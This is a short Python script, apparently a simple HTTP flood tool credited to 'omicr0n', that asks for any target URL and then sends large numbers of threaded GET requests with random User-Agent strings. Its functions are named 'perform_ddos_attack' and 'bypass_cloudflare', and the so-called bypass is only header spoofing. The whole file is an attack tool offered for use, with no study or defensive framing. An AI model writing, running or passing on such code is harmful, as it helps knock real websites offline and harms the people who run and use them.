import threading
import requests
from fake_useragent import UserAgent
import os

auth = ("""
▄▀▀▀▀▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▄ 
█      █ █  █ ▀  █ █   █  █  █ █    ▌ █   █   █ █      █ █  █ █ █ 
█      █ ▐  █    █ ▐   █  ▐  ▐ █      ▐  █▀▀█▀  █      █ ▐  █  ▀█ 
▀▄    ▄▀   █    █      █       █       ▄▀    █  ▀▄    ▄▀   █   █  
  ▀▀▀▀   ▄▀   ▄▀    ▄▀▀▀▀▀▄   ▄▀▄▄▄▄▀ █     █     ▀▀▀▀   ▄▀   █   
         █    █    █       █ █     ▐  ▐     ▐            █    ▐   
         ▐    ▐    ▐       ▐ ▐                           ▐        

         \x1b[32mcoding \x1b[31mby \x1b[32momicr0n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
""")

os.system("cls||clear")
print(auth)
target_url = input("\033[32mEnter the anyone address: \x1b[0m").strip()
num_threads = int(input("\033[32mHow many requests should it send per second: \x1b[0m").strip())
num_requests = int(input("\033[32mHow many requests should be made in total: \x1b[0m").strip()) 

def bypass_cloudflare(url):
    headers = {'User-Agent': UserAgent().random}
    response = requests.get(url, headers=headers)
    return response.text

def perform_ddos_attack(target_url, num_requests, num_threads):
    success_count = 0
    failure_count = 0
    lock = threading.Lock()

    def worker():
        nonlocal success_count, failure_count
        for _ in range(num_requests // num_threads):
            try:
                bypassed_content = bypass_cloudflare(target_url)
                with lock:
                    success_count += 1
                    print(f"\033[32m[+] Request successful: {success_count}")
            except Exception as e:
                with lock:
                    failure_count += 1
                    print(f"\033[31m[-] Failed request: {failure_count}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

perform_ddos_attack(target_url, num_requests, num_threads)